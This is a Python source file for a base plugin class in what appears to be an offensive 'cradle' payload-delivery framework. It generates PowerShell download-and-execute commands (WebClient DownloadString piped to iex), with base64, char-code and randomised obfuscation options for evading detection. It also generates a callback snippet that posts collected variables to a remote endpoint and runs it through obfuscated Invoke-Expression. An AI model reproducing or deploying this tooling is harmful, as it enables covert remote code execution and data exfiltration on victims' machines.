import base64

from abc import ABC, abstractmethod
from typing import Any, Dict, List
from core.models import CradleInstance
from core.obfuscate_getrandom import get_random_obfuscated_string as sgr

class BaseCradlePlugin(ABC):
    NAME: str = "undefined"
    DESCRIPTION: str = "No description"
    AUTHOR: str = "Unknown"
    CONTENT_TYPE: str = "text/plain"
    
    OPTIONS: Dict[str, Dict[str, Any]] = {
        "CRADLE_OBFUSCATION": {
            "description": "Cradle command obfuscation applied by the core before serving",
            "default": "getrandom",
            "restricted_to": ["none","base64","char","getrandom"]
        },
        "NEXT_CRADLE": {
            "description": "Next cradle to call when completed; set to UID or Index",
            "default": 0
        }
    }

    def __init__(self, endpoint_registry=None):
        self._endpoint_registry = endpoint_registry
    
    @abstractmethod
    def generate(self, inst: CradleInstance, obfuscated: bool = True) -> str:
        """Return the raw cradle payload as a string (no encoding applied)."""
        pass


    def cradle_command(self, inst: CradleInstance, cradle_url: str) -> str:
        obs_cradle = inst.options.get("CRADLE_OBFUSCATION","none").lower()
        cradle = f"(New-Object System.Net.WebClient).DownloadString(\"{cradle_url}\")|iex"

        if obs_cradle == "base64":
            return f".([System.Text.Encoding]::UTF8::GetString([System.Convert]::FromBase64String({base64.b64encode(cradle.encode("utf-16-le")).decode()})));"
        elif obs_cradle == "char":
            return f".(-join({[f"[char]{ord(c)}" for c in list(cradle)]}));"
        elif obs_cradle == "getrandom":
            return f"({sgr(cradle)})|iex"
        return f"{cradle}"
    
    def notification_callback_snippet(self, inst: CradleInstance, header_var_dict: dict, single_use: bool = True) -> str:
        notification_channel = self._endpoint_registry.create_notification_channel_for(inst.uid,single_use)
        snippet = f"""
$responseJson = @{{
{"\n".join(f"\t{x} = {header_var_dict[x]} | Out-String" for x in header_var_dict.keys())}
}} | ConvertTo-Json; Invoke-RestMethod -Uri "{self._endpoint_registry.get_cradle_command(notification_channel.uid)}" -Method Post -Body $responseJson
        """
        return f"({sgr(snippet)})|.({sgr("Invoke-Expression")});"

    
    def validate(self, inst: CradleInstance, options: dict) -> List[str]:
        errors = []
        merged = self.get_options_with_defaults(inst) | options
        for name, spec in self.OPTIONS.items():
            if spec.get("required", False) and not merged.get(name, ""):
                errors.append(f"Required option '{name}' is not set")
            if spec.get("restricted_to", False) and not merged.get(name, "") in spec.get("restricted_to", []):
                errors.append(f"'{name}' must be one of: {' | '.join(spec.get("restricted_to",[]))}")
        return errors
    
    def get_options_with_defaults(self, inst: CradleInstance) -> dict:
        result = {}
        options = inst.options
        for name, spec in self.OPTIONS.items():
            if name in options and options[name] != "":
                result[name] = options[name]
            elif "default" in spec:
                result[name] = spec["default"]
            else:
                result[name] = ""
        return result
    
